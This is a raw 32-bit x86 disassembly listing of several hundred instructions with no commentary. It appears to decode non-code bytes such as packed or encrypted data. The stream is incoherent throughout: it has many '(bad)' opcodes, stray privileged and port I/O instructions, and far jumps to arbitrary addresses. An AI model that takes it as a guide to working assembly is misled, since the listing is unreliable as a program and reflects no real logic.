  51f24e:	push   eax
  51f24f:	dec    esp
  51f250:	lock scas eax,DWORD PTR es:[edi]
  51f252:	loopne 0x51f273
  51f254:	fcmovbe st,st(5)
  51f256:	mov    esp,0x28fcbb47
  51f25b:	les    edx,FWORD PTR [edx+0x467c411f]
  51f261:	sub    bl,al
  51f263:	mov    ?,WORD PTR [esi+0x6fd36399]
  51f269:	popa   
  51f26a:	jg     0x51f2c5
  51f26c:	push   edx
  51f26d:	sub    DWORD PTR [ecx+0x60],0xffffffca
  51f271:	popf   
  51f272:	cs out dx,eax
  51f274:	xor    BYTE PTR fs:0xa989f099,cl
  51f27b:	add    al,0xe0
  51f27d:	dec    edx
  51f27e:	fwait
  51f27f:	mov    ?,edi
  51f281:	inc    esp
  51f282:	push   edi
  51f283:	cli    
  51f284:	cmp    esp,ebx
  51f286:	ins    DWORD PTR es:[edi],dx
  51f287:	ins    DWORD PTR es:[edi],dx
  51f288:	outs   dx,DWORD PTR ds:[esi]
  51f289:	fadd   DWORD PTR [esi-0x61]
  51f28c:	fdiv   QWORD PTR [edx+0x22a84b21]
  51f292:	icebp  
  51f293:	inc    eax
  51f294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51f295:	and    al,0x2b
  51f297:	dec    eax
  51f298:	dec    esi
  51f299:	les    ebp,FWORD PTR [edx]
  51f29b:	fnstenv [edx-0xf0d795d]
  51f2a1:	push   esi
  51f2a2:	popf   
  51f2a3:	clc    
  51f2a4:	and    esp,DWORD PTR [ebp+0x6057700e]
  51f2aa:	(bad)  
  51f2ab:	mov    ecx,0xc10e1a98
  51f2b0:	mov    ch,0x77
  51f2b2:	dec    edx
  51f2b3:	sub    eax,0x94af6b55
  51f2b8:	mov    ds:0xf556c7d5,eax
  51f2bd:	add    eax,0x1d3322dd
  51f2c2:	sbb    eax,0x45290e58
  51f2c8:	inc    eax
  51f2c9:	jno    0x51f2d9
  51f2cb:	jge    0x51f2e7
  51f2cd:	bound  ecx,QWORD PTR [eax-0x52]
  51f2d0:	mov    ah,0x43
  51f2d2:	inc    edx
  51f2d3:	pop    esi
  51f2d4:	inc    esi
  51f2d5:	imul   ecx,DWORD PTR [ecx-0x29],0xba0639d6
  51f2dc:	fstp   QWORD PTR [eiz*4-0x7c3efe0e]
  51f2e3:	cmp    BYTE PTR [ecx+0x5b],0xfe
  51f2e7:	imul   ebp,DWORD PTR [ebx],0x3d
  51f2ea:	lock pop esi
  51f2ec:	or     ecx,0x9ad41ac7
  51f2f2:	fwait
  51f2f3:	push   ebp
  51f2f4:	cmp    ah,ch
  51f2f6:	sub    ah,ch
  51f2f8:	hlt    
  51f2f9:	and    ebx,ecx
  51f2fb:	fucom  st(6)
  51f2fd:	rcl    ebx,1
  51f2ff:	mov    edx,0x14e5f2f0
  51f304:	add    edx,DWORD PTR [eax-0x20]
  51f307:	mov    ecx,0xbc1e9b4c
  51f30c:	ds (bad) 
  51f30e:	in     eax,dx
  51f30f:	sub    ch,BYTE PTR [edx+0x2385b015]
  51f315:	push   edi
  51f316:	mov    al,0x58
  51f318:	xlat   BYTE PTR ds:[ebx]
  51f319:	sbb    eax,0xe1f9ea0d
  51f31e:	pop    eax
  51f31f:	mov    bh,0xcd
  51f321:	int3   
  51f322:	cmp    DWORD PTR [eax],ebp
  51f324:	retf   
  51f325:	mov    al,ds:0xa14ac49
  51f32a:	loopne 0x51f34f
  51f32c:	mov    ch,0x48
  51f32e:	or     DWORD PTR [esi+0x63],0xfffffff3
  51f332:	jmp    0x40221d3f
  51f337:	jmp    0x6d6cd6a5
  51f33c:	sub    BYTE PTR [edx],0x91
  51f33f:	(bad)  
  51f340:	jb     0x51f367
  51f342:	jecxz  0x51f373
  51f344:	and    BYTE PTR [ebx],bl
  51f346:	sub    al,0xd0
  51f348:	in     al,0x41
  51f34a:	mov    al,0xba
  51f34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51f34d:	push   edi
  51f34e:	xor    eax,0xb8a15713
  51f353:	pop    eax
  51f354:	cmp    BYTE PTR [ebx+0x1],al
  51f357:	adc    ebp,edx
  51f359:	and    BYTE PTR [ebp+0x52d0e108],dl
  51f35f:	push   es
  51f360:	jge    0x51f350
  51f362:	(bad)
  51f366:	sub    BYTE PTR ds:0xca76ceb3,bl
  51f36c:	pop    esp
  51f36d:	repz pop edx
  51f36f:	sahf   
  51f370:	or     eax,0x6473d03c
  51f375:	adc    DWORD PTR [eax],eax
  51f377:	nop
  51f378:	and    BYTE PTR [ebx-0x13ba1d5d],bl
  51f37e:	cmp    al,bh
  51f380:	mov    ds:0xa961a21d,al
  51f385:	sub    BYTE PTR [edi-0x2f],al
  51f388:	mov    al,0x66
  51f38a:	out    0x1f,al
  51f38c:	loopne 0x51f319
  51f38e:	shl    DWORD PTR [esi+0x58],0x67
  51f392:	imul   eax,DWORD PTR [esi+0x22bf544d],0xffffffed
  51f399:	xor    dh,BYTE PTR [edx+0x64]
  51f39c:	pop    edx
  51f39d:	sub    eax,eax
  51f39f:	xlat   BYTE PTR ds:[ebx]
  51f3a0:	jmp    0xd01f:0x908dba8a
  51f3a7:	popa   
  51f3a8:	adc    BYTE PTR [esi],ah
  51f3aa:	gs (bad) 
  51f3ac:	jbe    0x51f42d
  51f3ae:	aaa    
  51f3af:	popf   
  51f3b0:	jecxz  0x51f401
  51f3b2:	sti    
  51f3b3:	and    bh,ch
  51f3b5:	add    al,0xe0
  51f3b7:	pop    esi
  51f3b8:	jno    0x51f3bd
  51f3ba:	lea    ecx,[edx]
  51f3bc:	les    edi,FWORD PTR [ecx-0x23a46c4]
  51f3c2:	das    
  51f3c3:	xor    al,0xd6
  51f3c5:	mov    bh,0xb3
  51f3c7:	jo     0x51f3ae
  51f3c9:	jp     0x51f39d
  51f3cb:	aam    0xab
  51f3cd:	(bad)  
  51f3ce:	mov    esi,0xecfb7d05
  51f3d3:	mov    DWORD PTR [edi+0x48a0a9dd],eax
  51f3d9:	aad    0x55
  51f3db:	data16 sub al,0x14
  51f3de:	sar    BYTE PTR ds:0x7a22b905,cl
  51f3e4:	xchg   esp,eax
  51f3e5:	cs pop edx
  51f3e7:	push   ss
  51f3e8:	add    BYTE PTR [ebp-0x6b],ah
  51f3eb:	pop    ss
  51f3ec:	mov    esp,0x42c3d7f8
  51f3f1:	test   al,0xe0
  51f3f3:	popa   
  51f3f4:	or     dl,BYTE PTR [ecx]
  51f3f6:	cmp    al,0xdb
  51f3f8:	jg     0x51f428
  51f3fa:	(bad)  
  51f3fb:	pop    ss
  51f3fc:	push   ecx
  51f3fd:	jl     0x51f433
  51f3ff:	pop    ecx
  51f400:	push   ecx
  51f401:	mov    esp,0xee4d944
  51f406:	adc    eax,0xfe892242
  51f40b:	xchg   ebx,eax
  51f40c:	lock mov dh,0xeb
  51f40f:	enter  0x87ec,0x24
  51f413:	repz jnp 0x51f436
  51f416:	int    0x36
  51f418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51f419:	add    ah,dh
  51f41b:	pop    ss
  51f41c:	lock outs dx,DWORD PTR ds:[esi]
  51f41e:	sub    al,0x67
  51f420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51f421:	and    ch,BYTE PTR [edi+esi*4]
  51f424:	es push 0x2a
  51f427:	aaa    
  51f428:	push   es
  51f429:	inc    ebp
  51f42a:	(bad)  
  51f42c:	(bad)  
  51f42e:	and    DWORD PTR [eax-0x15],ecx
  51f431:	mov    dh,0xd
  51f433:	lods   eax,DWORD PTR ds:[esi]
  51f434:	jp     0x51f437
  51f436:	cmp    ebx,ebp
  51f438:	inc    ecx
  51f439:	lods   al,BYTE PTR ds:[esi]
  51f43a:	or     al,0x66
  51f43c:	cmp    bl,BYTE PTR [edi+0x417bcc4c]
  51f442:	xchg   edi,eax
  51f443:	imul   sp,WORD PTR [ecx+0x32],0x3d
  51f448:	aaa    
  51f449:	fistp  DWORD PTR [edx]
  51f44b:	cmp    ax,0xa6ca
  51f44f:	in     eax,0x7
  51f451:	jae    0x51f429
  51f453:	fisubr DWORD PTR [edx-0x32408d6e]
  51f459:	sub    al,0xb
  51f45b:	lods   al,BYTE PTR ds:[esi]
  51f45c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51f45d:	das    
  51f45e:	hlt    
  51f45f:	cmc    
  51f460:	xchg   ecx,eax
  51f461:	xchg   esp,eax
  51f462:	jno    0x51f41c
  51f464:	ffree  st(2)
  51f466:	push   ss
  51f467:	(bad)  
  51f469:	sub    al,0xdc
  51f46b:	pop    edx
  51f46c:	pop    es
  51f46d:	sbb    ah,BYTE PTR [ebp+eiz*8-0x4f9b409e]
  51f474:	stos   DWORD PTR es:[edi],eax
  51f475:	push   ecx
  51f476:	mov    ch,BYTE PTR [edx]
  51f478:	das    
  51f479:	add    esi,DWORD PTR [ebp+eax*8-0x3f937493]
  51f480:	sar    DWORD PTR [eax+0x6],0x5c
  51f484:	cmp    BYTE PTR [edx-0x75],al
  51f487:	pop    esp
  51f488:	sub    ch,bh
  51f48a:	out    0x24,al
  51f48c:	stos   BYTE PTR es:[edi],al
  51f48d:	add    ecx,edx
  51f48f:	mov    esp,0xda79e51d
  51f494:	xor    DWORD PTR [eax-0x1f],0x5e59e495
  51f49b:	lods   al,BYTE PTR ds:[esi]
  51f49c:	lock jnp 0x51f4ba
  51f49f:	div    eax
  51f4a1:	repnz pushf 
  51f4a3:	jmp    0x72ff012c
  51f4a8:	das    
  51f4a9:	fnstcw WORD PTR [edx-0x30bac5e9]
  51f4af:	fidiv  WORD PTR [ebx]
  51f4b1:	and    edx,edx
  51f4b3:	ret    
  51f4b4:	mov    al,0x98
  51f4b6:	in     al,dx
  51f4b7:	cld    
  51f4b8:	or     DWORD PTR [edi-0x41],ebp
  51f4bb:	lahf   
  51f4bc:	or     ebp,DWORD PTR [edx+0x59]
  51f4bf:	shl    DWORD PTR [ebp-0x4b],cl
  51f4c2:	push   esi
  51f4c3:	adc    ecx,DWORD PTR [edi+0x5e17c843]
  51f4c9:	push   ebp
  51f4ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51f4cb:	mov    eax,0x870298
  51f4d0:	scas   eax,DWORD PTR es:[edi]
  51f4d1:	sahf   
  51f4d2:	mov    es,WORD PTR [ebx-0x192b4146]
  51f4d8:	fadd   DWORD PTR [eax+ebp*4-0x25]
  51f4dc:	enter  0x29fa,0x50
  51f4e0:	push   0xcec0c3f7
  51f4e5:	push   ecx
  51f4e6:	int    0xaa
  51f4e8:	stc    
  51f4e9:	outs   dx,BYTE PTR ds:[esi]
  51f4ea:	sbb    ah,bh
  51f4ec:	ja     0x51f4dc
  51f4ee:	cmc    
  51f4ef:	pop    ds
  51f4f0:	mov    ah,0x84
  51f4f2:	cmp    eax,0xf73a5196
  51f4f7:	aaa    
  51f4f8:	out    dx,eax
  51f4f9:	inc    esp
  51f4fa:	sub    esp,DWORD PTR [eax-0x69]
  51f4fd:	aam    0x11
  51f4ff:	(bad)  
  51f501:	xor    BYTE PTR [eax],dh
  51f503:	js     0x51f52e
  51f505:	dec    edx
  51f506:	popa   
  51f507:	and    ah,cl
  51f509:	fist   WORD PTR [edx+ebp*8-0x75e75fcf]
  51f510:	into   
  51f511:	pop    esp
  51f512:	push   ebp
  51f513:	nop
  51f514:	or     eax,0x9153947a
  51f519:	jo     0x51f49f
  51f51b:	push   edi
  51f51c:	outs   dx,DWORD PTR ds:[esi]
  51f51d:	(bad)
  51f522:	bound  ebp,QWORD PTR [eax]
  51f524:	adc    BYTE PTR [eax-0x6add58f0],dh
  51f52a:	or     eax,ebp
  51f52c:	xor    DWORD PTR [ebx+0x95c749],ebp
  51f532:	in     al,0x9f
  51f534:	jge    0x51f5b5
  51f536:	repnz pop edi
  51f538:	or     edx,ebp
  51f53a:	pop    esp
  51f53b:	jp     0x51f574
  51f53d:	lock out dx,eax
  51f53f:	in     al,0xe2
  51f541:	push   eax
  51f542:	mov    bl,0xd5
  51f544:	ds call 0x3645:0x99753ac3
  51f54c:	shr    DWORD PTR [edi+0x7f],1
  51f54f:	cmp    BYTE PTR [eax+0x5661131b],cl
  51f555:	and    BYTE PTR [ebx],0xc
  51f558:	imul   esi,DWORD PTR [ebp+0xa429208],0x31c10f59
  51f562:	sti    
  51f563:	scas   al,BYTE PTR es:[edi]
  51f564:	ret    
  51f565:	jle    0x51f4f5
  51f567:	adc    bh,cl
  51f569:	gs stos BYTE PTR es:[edi],al
  51f56b:	lds    ebx,FWORD PTR [ebx-0x5f7708a8]
  51f571:	pop    ebp
  51f572:	popf   
  51f573:	cmp    DWORD PTR [eax+0x53],esi
  51f576:	sbb    al,0x7
  51f578:	inc    ebx
  51f579:	shl    BYTE PTR ds:0x670b0f7f,0x87
  51f580:	mov    ebx,ss
  51f582:	xchg   edx,eax
  51f583:	xor    BYTE PTR ds:0x67fe4b29,0x16
  51f58a:	cdq    
  51f58b:	fst    DWORD PTR [esp+edi*8-0x4e040ae8]
  51f592:	sbb    BYTE PTR [ecx],dl
  51f594:	jbe    0x51f595
  51f596:	mov    eax,DWORD PTR [ecx-0x7dadd713]
  51f59c:	xor    DWORD PTR [edx],edx
  51f59e:	inc    edi
  51f59f:	xchg   edi,eax
  51f5a0:	loopne 0x51f5b2
  51f5a2:	and    DWORD PTR [edi],0x2441a0a3
  51f5a8:	jg     0x51f614
  51f5aa:	push   eax
  51f5ab:	cdq    
  51f5ac:	xor    al,ch
  51f5ae:	aaa    
  51f5af:	neg    DWORD PTR [ecx]
  51f5b1:	test   eax,0xd919734b
  51f5b6:	cld    
  51f5b7:	fwait
  51f5b8:	dec    edx
  51f5b9:	lea    esp,[ecx+edi*4]
  51f5bc:	xchg   ebp,eax
  51f5bd:	ins    DWORD PTR es:[edi],dx
  51f5be:	pusha  
  51f5bf:	aas    
  51f5c0:	xor    ah,bl
  51f5c2:	push   esp
  51f5c3:	ja     0x51f573
  51f5c5:	ror    dl,cl
  51f5c7:	mov    dh,0xc4
  51f5c9:	sbb    al,0x1d
  51f5cb:	sbb    DWORD PTR [edi+ebx*1+0x13b724ef],esp
  51f5d2:	sbb    edx,DWORD PTR [eax-0x2b5d0396]
  51f5d8:	mov    ebp,0xaa27aa8d
  51f5dd:	add    BYTE PTR [ecx],0x98
  51f5e0:	push   edi
  51f5e1:	mov    esi,0xb3533a3c
  51f5e6:	out    dx,al
  51f5e7:	fistp  QWORD PTR [eax+0xdef902e]
  51f5ed:	jns    0x51f5af
  51f5ef:	push   cs
  51f5f0:	or     DWORD PTR [esi-0x4e7151f8],ebp
  51f5f6:	mov    ds,WORD PTR cs:[ebp-0x6e2a6c15]
  51f5fd:	mov    ebx,0x4980a67e
  51f602:	push   esp
  51f603:	inc    ebp
  51f604:	outs   dx,DWORD PTR ds:[esi]
  51f605:	mov    esp,0x4a733dbf
  51f60a:	dec    ebx
  51f60b:	pop    ds
  51f60c:	call   0x8dd6:0x73ff24fe
  51f613:	es jecxz 0x51f5b2
  51f616:	int    0x0
  51f618:	icebp  
  51f619:	add    al,0xa1
  51f61b:	adc    al,0xa4
  51f61d:	repz cli 
  51f61f:	push   ds
  51f620:	mov    esi,0x6866c12d
  51f625:	mov    ch,0xa8
  51f627:	mov    eax,ds:0x5ea07a0d
  51f62c:	test   BYTE PTR [esi+0x6e0aaecf],0x87
  51f633:	or     eax,0x99273c9b
  51f638:	sub    eax,0x909d9b36
  51f63d:	dec    eax
  51f63e:	push   ebp
  51f63f:	ror    bh,cl
  51f641:	sub    BYTE PTR [esi],dl
  51f643:	push   esi
  51f644:	add    al,BYTE PTR [eax-0x545365e4]
  51f64a:	inc    ebx
  51f64b:	mov    ebp,DWORD PTR [edx-0x7a]
  51f64e:	addr16 push ds
  51f650:	es adc eax,0xc773b5ca
  51f656:	daa    
  51f657:	aad    0xe7
  51f659:	mov    ds:0x3a1bd1d6,eax
  51f65e:	outs   dx,BYTE PTR ds:[esi]
  51f65f:	sbb    eax,0xb45feb0
  51f664:	xchg   ebx,eax
  51f665:	popa   
  51f666:	xchg   BYTE PTR [ecx-0x67],dl
  51f669:	std    
  51f66a:	aaa    
  51f66b:	dec    eax
  51f66c:	pop    ds
  51f66d:	jae    0x51f67f
  51f66f:	inc    edi
  51f670:	pop    es
  51f671:	push   esi
  51f672:	dec    eax
  51f673:	push   edi
  51f674:	or     al,BYTE PTR [eax-0x3d]
  51f677:	xor    eax,0x64331b8f
  51f67c:	xchg   edx,edx
  51f67e:	and    edi,DWORD PTR [edi+0x2b]
  51f681:	jp     0x51f67f
  51f683:	adc    ecx,DWORD PTR [edi-0x43]
  51f686:	dec    esp
  51f687:	scas   eax,DWORD PTR es:[edi]
  51f688:	aas    
  51f689:	dec    eax
  51f68a:	push   es
  51f68b:	lods   eax,DWORD PTR ds:[esi]
  51f68c:	pop    edx
  51f68d:	xadd   BYTE PTR [ebp+0x7ca4223c],bh
  51f694:	mov    WORD PTR [ecx],es
  51f696:	sub    eax,0xe901e599
  51f69b:	xor    edi,0xc0e01c6
  51f6a1:	fs sbb eax,0x8a078b25
  51f6a7:	push   ebx
  51f6a8:	out    dx,al
  51f6a9:	xchg   esi,eax
  51f6aa:	cli    
  51f6ab:	and    eax,0x4d370682
  51f6b0:	scas   eax,DWORD PTR es:[edi]
  51f6b1:	aas    
  51f6b2:	pop    edi
  51f6b3:	add    bl,0xcf
  51f6b6:	aaa    
  51f6b7:	aaa    
  51f6b8:	mov    ebp,0x25bc417f
  51f6bd:	xchg   esi,eax
  51f6be:	push   edi
  51f6bf:	call   0x7fff3843
  51f6c4:	inc    ebp
  51f6c5:	mov    ah,0xa5
  51f6c7:	repnz stc 
  51f6c9:	fstp   QWORD PTR [ebp-0xa]
  51f6cc:	mov    ch,0x75
  51f6ce:	ins    DWORD PTR es:[edi],dx
  51f6cf:	imul   ecx,DWORD PTR [esi],0x36
  51f6d2:	iret   
  51f6d3:	outs   dx,BYTE PTR ds:[esi]
  51f6d4:	repz adc al,0x53
  51f6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51f6d8:	repz xchg edi,eax
  51f6da:	jg     0x51f667
  51f6dc:	push   0xffffff90
  51f6de:	pushf  
  51f6df:	mul    DWORD PTR [ebx+esi*1]
  51f6e2:	stos   BYTE PTR es:[edi],al
  51f6e3:	jmp    0x27b6e5d3
  51f6e8:	arpl   WORD PTR [edx+0x5c],ax
  51f6eb:	fnstsw WORD PTR [esi-0x41]
  51f6ee:	ins    BYTE PTR es:[edi],dx
  51f6ef:	(bad)  
  51f6f1:	call   0xf5cb:0xc6c5f88e
  51f6f8:	les    ebp,FWORD PTR cs:[edi+0x28d65357]
  51f6ff:	adc    al,0x48
  51f701:	inc    esi
  51f702:	fsub   DWORD PTR [edx+0x66]
  51f705:	dec    esp
  51f706:	aam    0x29
  51f708:	ja     0x51f732
  51f70a:	les    ebp,FWORD PTR [edi+0x1033ca60]
  51f710:	cmc    
  51f711:	je     0x51f6aa
  51f713:	dec    esi
  51f714:	push   edx
  51f715:	mov    cl,0xa2
  51f717:	test   eax,0xf4945493
  51f71c:	(bad)  
  51f71e:	shl    BYTE PTR [ebp-0x3bb1a899],cl
  51f724:	pop    ss
  51f725:	inc    esp
  51f726:	push   ds
  51f727:	out    0x6d,eax
  51f729:	out    dx,al
  51f72a:	push   0xf8af0229
  51f72f:	sbb    edx,DWORD PTR [edi+0x17]
  51f732:	nop    edi
  51f735:	aad    0x7e
  51f737:	wbinvd 
  51f739:	icebp  
  51f73a:	outs   dx,BYTE PTR ds:[esi]
  51f73b:	call   0x7c46:0x424aece4
  51f742:	in     al,dx
  51f743:	xor    DWORD PTR [ebx],esi
  51f745:	push   ss
  51f746:	out    0x87,eax
  51f748:	cmp    esp,DWORD PTR [ebp+0x16]
  51f74b:	sahf   
  51f74c:	add    ah,BYTE PTR [ebx-0x55627594]
  51f752:	aas    
  51f753:	imul   esp,DWORD PTR [eax+0x382b27e0],0xffffffe7
  51f75a:	jp     0x51f6e6
  51f75c:	sub    BYTE PTR [ebp+0x75e174d0],0xe6
  51f763:	add    BYTE PTR [ecx+ecx*2+0x1b33607f],al
  51f76a:	cli    
  51f76b:	jae    0x51f7a9
  51f76d:	mov    esi,0x48d27600
  51f772:	retf   
  51f773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51f774:	arpl   WORD PTR [edi],ax
  51f776:	mov    bl,0xc5
  51f778:	pop    edi
  51f779:	inc    ebx
  51f77a:	bound  esi,QWORD PTR [eax-0x49]
  51f77d:	loope  0x51f762
  51f77f:	sbb    BYTE PTR [eax-0x6171b083],ch
  51f785:	pop    ebx
  51f786:	or     ah,dh
  51f788:	sub    BYTE PTR ds:0xd445d4e6,bl
  51f78e:	add    al,0xe5
  51f790:	push   ebx
  51f791:	fwait
  51f792:	stos   BYTE PTR es:[edi],al
  51f793:	in     al,dx
  51f794:	call   0x782b:0x207c9e84
  51f79b:	push   esi
  51f79c:	fiadd  DWORD PTR [ebp+0x5c]
  51f79f:	(bad)  
  51f7a0:	loopne 0x51f759
  51f7a2:	push   0x260776b7
  51f7a7:	ret    
  51f7a8:	or     al,0x24
  51f7aa:	cmp    ebp,DWORD PTR [edi]
  51f7ac:	jecxz  0x51f76a
  51f7ae:	cdq    
  51f7af:	sar    BYTE PTR [edx],cl
  51f7b1:	cmp    bh,0xb8
  51f7b4:	add    eax,0x3b3cfa67
  51f7b9:	dec    eax
  51f7ba:	jae    0x51f78b
  51f7bc:	out    dx,al
  51f7bd:	push   ds
  51f7be:	dec    esp
  51f7bf:	add    al,0xb3
  51f7c1:	mov    dl,0xfa
  51f7c3:	jp     0x51f814
  51f7c5:	dec    esp
  51f7c6:	es popf 
  51f7c8:	add    bl,dl
  51f7ca:	loop   0x51f7c1
  51f7cc:	ror    BYTE PTR [ecx-0x1ede3465],cl
  51f7d2:	imul   eax,DWORD PTR [ebp+0x43],0x1bb968f3
  51f7d9:	mov    al,ds:0xb98fe7f6
  51f7de:	adc    edx,edx
  51f7e0:	sbb    dl,0x90
  51f7e3:	(bad)  
  51f7e5:	jb     0x51f7d1
  51f7e7:	js     0x51f856
  51f7e9:	and    DWORD PTR [ecx],esp
  51f7eb:	sbb    DWORD PTR ds:0x9015a325,edi
  51f7f1:	xor    eax,0x9b5a18a
  51f7f6:	scas   al,BYTE PTR es:[edi]
  51f7f7:	add    al,0xf4
  51f7f9:	idiv   DWORD PTR [ebp+eiz*2+0x3759aeb3]
  51f800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51f801:	ret    
  51f802:	dec    eax
  51f803:	adc    dh,BYTE PTR [esi]
  51f805:	retf   
  51f806:	fsubr  QWORD PTR [edi+0x3]
  51f809:	push   es
  51f80a:	xor    eax,0xfe96fb97
  51f80f:	mov    dl,0x13
  51f811:	neg    BYTE PTR [ebx]
  51f813:	push   0xb
  51f815:	xchg   ebx,eax
  51f816:	push   ecx
  51f817:	xor    DWORD PTR [eax-0x15],ebp
  51f81a:	pop    ebp
  51f81b:	in     eax,0xbc
  51f81d:	cmp    DWORD PTR [ebp-0x62aece],0x79
  51f824:	test   al,0x41
  51f826:	pusha  
  51f827:	ror    DWORD PTR [eax-0x64],1
  51f82a:	jns    0x51f858
  51f82c:	push   ecx
  51f82d:	jecxz  0x51f822
  51f82f:	dec    ebx
  51f830:	cmp    dh,cl
  51f832:	mov    esp,0x465d9086
  51f837:	ret    0x3511
  51f83a:	(bad)  
  51f83b:	cmc    
  51f83c:	xchg   esp,eax
  51f83d:	add    edi,DWORD PTR [esi+0x1c639a2c]
  51f843:	xor    ch,BYTE PTR [ebp-0x24]
  51f846:	mov    edi,0x2ca6e0db
  51f84b:	aaa    
  51f84c:	dec    ebp
  51f84d:	fcom   QWORD PTR [edx+0x47d7f90d]
  51f853:	or     BYTE PTR [edx+ebx*2],0x87
  51f857:	mov    ds:0x6d0c4888,eax
  51f85c:	arpl   WORD PTR [ebp+0x1d],cx
  51f85f:	sahf   
  51f860:	sti    
  51f861:	dec    ebx
  51f862:	push   es
  51f863:	mov    al,0x5b
  51f865:	xor    cl,BYTE PTR [ecx+ebp*4-0x47]
  51f869:	nop
  51f86a:	pop    esp
  51f86b:	dec    ebp
  51f86c:	mov    dh,0x6c
  51f86e:	lahf   
  51f86f:	mov    bh,0x90
  51f871:	push   edi
  51f872:	inc    edi
  51f873:	ja     0x51f892
  51f875:	loopne 0x51f848
  51f877:	call   0xf09fdbaa
  51f87c:	loope  0x51f808
  51f87e:	push   esp
  51f87f:	adc    al,0xe
  51f881:	or     al,0xb7
  51f883:	scas   al,BYTE PTR es:[edi]
  51f884:	and    eax,0xad7112ca
  51f889:	outs   dx,BYTE PTR ds:[esi]
  51f88a:	cmp    DWORD PTR [ebx],esp
  51f88c:	adc    BYTE PTR [esi],ah
  51f88e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51f88f:	mov    bh,0xdd
  51f891:	pop    esi
  51f892:	cmp    al,0x45
  51f894:	mov    bh,0x36
  51f896:	mov    bh,0x6b
  51f898:	pop    edx
  51f899:	cmc    
  51f89a:	xchg   esp,eax
  51f89b:	xor    eax,0x3f035baf
  51f8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51f8a1:	and    ebp,ecx
  51f8a3:	sbb    DWORD PTR [ebp-0x3e],ebx
  51f8a6:	mov    edi,ebp
  51f8a8:	cld    
  51f8a9:	sahf   
  51f8aa:	nop
  51f8ab:	outs   dx,DWORD PTR ds:[esi]
  51f8ac:	or     DWORD PTR [ebx+0x146d03df],esp
  51f8b2:	test   al,0x2b
  51f8b4:	xchg   ebx,eax
  51f8b5:	or     BYTE PTR [ebp-0x66],0x84
  51f8b9:	cmp    ah,BYTE PTR [ebx-0x3]
  51f8bc:	mov    esp,0x952f9ce9
  51f8c1:	in     al,dx
  51f8c2:	loopne 0x51f872
  51f8c4:	sbb    ch,al
  51f8c6:	sub    bh,BYTE PTR [esi+0x36]
  51f8c9:	cmp    DWORD PTR [esi-0x5f101575],eax
  51f8cf:	fstp   DWORD PTR [eax]
  51f8d1:	add    DWORD PTR [ebp+ebx*1+0xa8d300d],0x326fdf5b
  51f8dc:	inc    ebx
  51f8dd:	pop    eax
  51f8de:	jg     0x51f934
  51f8e0:	or     DWORD PTR [edx],edx
  51f8e2:	cs (bad) 
  51f8e6:	pop    es
  51f8e7:	cmp    DWORD PTR [ecx],ecx
  51f8e9:	fcmovb st,st(6)
  51f8eb:	lea    edx,[edi-0x2fd2ea1c]
  51f8f1:	rcr    BYTE PTR [ebx],0x64
  51f8f4:	pusha  
  51f8f5:	adc    esp,0x230ad7ea
  51f8fb:	push   ebx
  51f8fc:	adc    al,0xe1
  51f8fe:	pusha  
  51f8ff:	jl     0x51f93f
  51f901:	and    DWORD PTR [ebp+0x67e2acac],edx
  51f907:	loopne 0x51f8a9
  51f909:	dec    edi
  51f90a:	sub    dl,bh
  51f90c:	in     al,0x69
  51f90e:	adc    DWORD PTR [esp+esi*4+0x6d4b9ff3],0x79311ee0
  51f919:	pop    edi
  51f91a:	mov    eax,ds:0x7d12dbb6
  51f91f:	dec    edi
  51f920:	mov    ebx,0x62cf5b5e
  51f925:	sub    eax,ebp
  51f927:	imul   eax,DWORD PTR [ebp-0x71],0xd09c7ee1
  51f92e:	xchg   ebx,eax
  51f92f:	arpl   WORD PTR [ecx+0x41e5509],ax
  51f935:	cmp    BYTE PTR [ecx],al
  51f937:	cmc    
  51f938:	pop    edx
  51f939:	clc    
  51f93a:	fimul  DWORD PTR [ecx]
  51f93c:	mov    al,0xd
  51f93e:	push   0xda1f3f35
  51f943:	(bad)  
  51f944:	repnz pop ss
  51f946:	pop    ebx
  51f947:	(bad)  
  51f948:	pushf  
  51f949:	push   ecx
  51f94a:	lea    edx,[esi]
  51f94c:	push   0x8
  51f94e:	les    eax,FWORD PTR [ebx-0x372f2d06]
  51f954:	and    BYTE PTR [edx+esi*1+0x5a88e145],ch
  51f95b:	add    al,BYTE PTR ds:0xdc4bb708
  51f961:	push   ss
  51f962:	sbb    dh,BYTE PTR [eax+0x48beaed6]
  51f968:	aaa    
  51f969:	in     eax,dx
  51f96a:	mov    esp,0x74ebe954
  51f96f:	mov    cl,0xaa
  51f971:	xchg   ebp,ebx
  51f973:	rcr    DWORD PTR [ebx],1
  51f975:	shr    edi,cl
  51f977:	ja     0x51f9a6
  51f979:	adc    DWORD PTR [edx-0x48],edx
  51f97c:	pmulhuw mm6,mm7
  51f97f:	jo     0x51f98c
  51f981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51f982:	cmp    al,0x3
  51f984:	(bad)  
  51f986:	hlt    
  51f987:	mov    ch,BYTE PTR [ecx]
  51f989:	mov    cl,0xe5
  51f98b:	pop    ss
  51f98c:	out    0xc1,al
  51f98e:	mov    esp,0xfceea6d6
  51f993:	pop    esi
  51f994:	shl    al,0xa3
  51f997:	aam    0x10
  51f999:	sahf   
  51f99a:	addr16 jb 0x51f9d4
  51f99d:	and    DWORD PTR [ebx],edx
  51f99f:	xor    esp,ebx
  51f9a1:	xchg   esp,eax
  51f9a2:	inc    esi
  51f9a3:	and    eax,0xb2ee267e
  51f9a8:	stos   DWORD PTR es:[edi],eax
  51f9a9:	cmp    BYTE PTR [eax+ecx*1-0x10b37c83],al
  51f9b0:	scas   al,BYTE PTR es:[edi]
  51f9b1:	sub    bl,BYTE PTR [ecx-0x6f5f6230]
  51f9b7:	pop    eax
  51f9b8:	aaa    
  51f9b9:	push   esp
  51f9ba:	inc    esp
  51f9bb:	xchg   edx,eax
  51f9bc:	jg     0x51f973
  51f9be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
